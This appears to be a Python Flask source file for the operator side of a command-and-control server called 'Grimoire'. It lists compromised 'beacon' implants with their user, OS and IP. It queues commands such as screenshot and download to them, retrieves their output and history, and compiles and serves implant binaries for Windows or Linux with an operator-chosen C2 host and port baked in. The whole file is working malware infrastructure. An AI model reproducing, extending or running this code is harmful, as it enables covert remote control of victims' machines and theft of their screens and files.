# 操作的地方
import os
import shutil
import subprocess
import uuid
from flask import Blueprint, jsonify, current_app, request, send_file
from flask_jwt_extended import jwt_required
from server.persistence.database import get_db_session

# 蓝图定义，URL 前缀为 /operator
operator_bp = Blueprint('operator_api', __name__, url_prefix='/api/operator')

def get_services():
    """从应用配置中获取所有共享的服务实例"""
    app_config = current_app.config
    return {
        'crypto_mgr': app_config['CRYPTO_MANAGER'],
        'beacon_service': app_config['BEACON_SERVICE'],
        'task_service': app_config['TASK_SERVICE']
    }


# 获取所有 Beacon 列表 (GET /operator/beacons)
@operator_bp.route('/beacons', methods=['GET'])
@jwt_required()
def list_beacons():
    services = get_services()
    beacon_service = services['beacon_service']
    with get_db_session() as db:
        # 获取所有 Beacon，按最后签入时间倒序排列
        beacons = beacon_service.get_all_beacons(db)

        # 格式化输出，用于 Web UI
        beacon_list = [
            {
                'id': b.id,
                'user': b.username,
                'os': b.os_info,
                'ip_address': b.ip_address,
                'last_checkin': b.last_checkin.isoformat(),
                'status': b.status,
                # 'sleep_interval': b.sleep_interval
            }
            for b in beacons
        ]

    return jsonify(beacon_list), 200


# 创建新任务 (POST /operator/task/create)
@operator_bp.route('/task/create', methods=['POST'])
@jwt_required()
def create_new_task():
    services = get_services()
    task_service = services['task_service']

    data = request.get_json()
    beacon_id = data.get('beacon_id')
    command = data.get('command')
    arguments = data.get('arguments')

    if not all([beacon_id, command]):
        return jsonify({'error': 'Missing beacon_id or command type'}), 400

    with get_db_session() as db:
        try:
            # TaskService 负责将任务写入数据库，状态为 PENDING
            task = task_service.create_task(db, beacon_id, command, arguments)


            # 这里有个时间差，直接commit了
            db.commit()
            db.refresh(task)
        except ValueError as e:
            # 例如：如果 beacon_id 不存在或无效
            return jsonify({'error': str(e)}), 500

        # 返回任务 ID 给操作员
        return jsonify({'message': 'Task created successfully', 'task_id': task.task_id}), 201


# 查询特定任务结果 (GET /operator/task/output/<task_id>)
@operator_bp.route('/task/output/<int:task_id>', methods=['GET'])
@jwt_required()
def get_task_output(task_id):
    services = get_services()
    task_service = services['task_service']

    with get_db_session() as db:
        task_info = task_service.get_task_output_by_id(db, task_id)

        if not task_info:
            return jsonify({'error': f'Task ID {task_id} not found'}), 404

        # 提取 Task 和 Output 对象
        task = task_info.task
        output = task_info.output  # output 可能是 None，如果任务未执行完

        # 确定内容和格式
        output_content = output.content if output else None

        # 确定内容类型：前端依赖这个字段来决定是直接显示文本还是 Base64 解码
        if task.command in ['screenshot', 'download']:
            content_type = 'base64'
        else:
            content_type = 'text'

        # 格式化输出
        return jsonify({
            'task_id': task.task_id,
            'beacon_id': task.beacon_id,
            'status': task.status,  # PENDING, ASSIGNED, COMPLETED, FAILED
            'command': task.command,
            'arguments': task.arguments,
            'assigned_at': task.assigned_at.isoformat() if task.assigned_at else None,

            # 核心返回内容
            'output_type': content_type,
            'output_content': output_content,  # 可能是 Base64 字符串或纯文本
        })

@operator_bp.route('/task/history/<string:beacon_id>', methods=['GET'])
@jwt_required()
def get_beacon_history(beacon_id):
    """
    根据 Beacon ID (SF) 查询该植入物的所有任务历史记录和输出。
    """
    services = get_services()
    task_service = services['task_service']


    try:
        # 验证 Beacon ID
        if not beacon_id or len(beacon_id) != 64:
            return jsonify({"error": "Invalid Beacon ID format. Must be 64 characters."}), 400

        with get_db_session() as db:
            # 从服务层获取该 Beacon 的所有任务记录
            history_list = task_service.get_tasks_by_beacon_id(db, beacon_id)

            if not history_list:
                return jsonify([]), 200  # 该 Beacon 尚未执行任何任务

            formatted_history = []
            for task_info in history_list:
                # task_info 应该是一个包含 task 和 output 属性的聚合对象 (类似你 get_task_output 中的 task_info)
                task = task_info.task
                output = task_info.output

                # 确定内容和格式
                output_content = output.content if output else None

                if output and task.command in ['screenshot', 'download']:
                    content_type = 'base64'
                else:
                    content_type = 'text'

                # 格式化结果列表
                formatted_history.append({
                    'task_id': task.task_id,
                    'status': task.status,
                    'command': task.command,
                    'arguments': task.arguments,
                    'assigned_at': task.assigned_at.isoformat() if task.assigned_at else None,
                    'completed_at': task.completed_at.isoformat() if task.completed_at else None,

                    'output_type': content_type,
                    # 仅返回输出预览，不返回完整大数据（例如整个 Base64 截图）
                    'output_preview': output_content[:200] + "..." if output_content and len(
                        output_content) > 200 else output_content,
                    'output_received_at': output.received_at.isoformat() if output else None
                })

            return jsonify(formatted_history), 200

    except Exception as e:
        print(f"[ERROR] Failed to retrieve task history for {beacon_id}: {e}")
        return jsonify({"error": "Internal server error"}), 500


@operator_bp.route('/payload/generate', methods=['POST'])
@jwt_required()
def generate_payload():
    win_env = os.environ.copy()
    data = request.json
    c2_host = data.get('host', '127.0.0.1')
    c2_port = data.get('port', '8080')
    c2_proto = data.get('protocol', 'http://')
    target_os = data.get('platform', 'windows')  # 获取前端传来的平台

    base_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
    source_dir = os.path.join(base_dir, "beacon")

    # 临时目录
    build_id = str(uuid.uuid4())[:8]
    work_dir = os.path.abspath(os.path.join(base_dir, f"tmp/build_{build_id}"))
    os.makedirs(work_dir, exist_ok=True)

    try:
        cmake_configure = ["cmake"]

        if target_os == 'windows':
            clion_mingw_bin = "D:/IDEs/CLion 2025.3.2/bin/mingw/bin"
            clion_mingw_bin = os.path.normpath(clion_mingw_bin)
            win_env["PATH"] = clion_mingw_bin + os.pathsep + win_env["PATH"]
            cmake_configure += [
                "-G", "MinGW Makefiles",
                f"-DCMAKE_C_COMPILER={os.path.join(clion_mingw_bin, 'gcc.exe')}",
                f"-DCMAKE_CXX_COMPILER={os.path.join(clion_mingw_bin, 'g++.exe')}",
                f"-DCMAKE_MAKE_PROGRAM={os.path.join(clion_mingw_bin, 'mingw32-make.exe')}"
            ]
            extension = ".exe"
            binary_name = "GrimoireBeacon.exe"

        elif target_os == 'linux':
            cmake_configure += [
                "-G", "Unix Makefiles",
                "-DCMAKE_C_COMPILER=gcc",
                "-DCMAKE_CXX_COMPILER=g++"
            ]
            extension = ".elf"
            binary_name = "GrimoireBeacon"# Linux 默认没后缀
        else:
            return jsonify({"error": "不支持的平台，你难道想编个游戏机版吗？"}), 400

        # 注入注入宏定义
        cmake_configure += [
            f"-DC2_HOST_CONFIG={c2_host}",
            f"-DC2_PORT_CONFIG={c2_port}",
            f"-DC2_PROTOCOL_CONFIG={c2_proto}",
            "-DCMAKE_BUILD_TYPE=Release",
            source_dir
        ]



        # 配置并编译
        result = subprocess.run(cmake_configure, cwd=work_dir, capture_output=True, text=True, encoding='utf-8',env=win_env)


        # if result.returncode != 0:
        #     print(result.stdout)
        #     print(result.stderr)
        #     return jsonify({
        #         "error": "CMake失败",
        #         "details": result.stderr if result.stderr else result.stdout
        #     }), 500



        subprocess.run(["cmake", "--build", ".", "--config", "Release", "-j4"],
                       cwd=work_dir, capture_output=True, text=True, check=True,env=win_env)


        payload_path = os.path.join(work_dir, binary_name)
        if os.path.exists(payload_path):
            return send_file(payload_path, as_attachment=True, download_name=f"Grimoire_{build_id}{extension}")

    except subprocess.CalledProcessError as e:
        return jsonify({"error": "失败", "details": e.stderr or e.stdout}), 500
    finally:
        shutil.rmtree(work_dir, ignore_errors=True)
        pass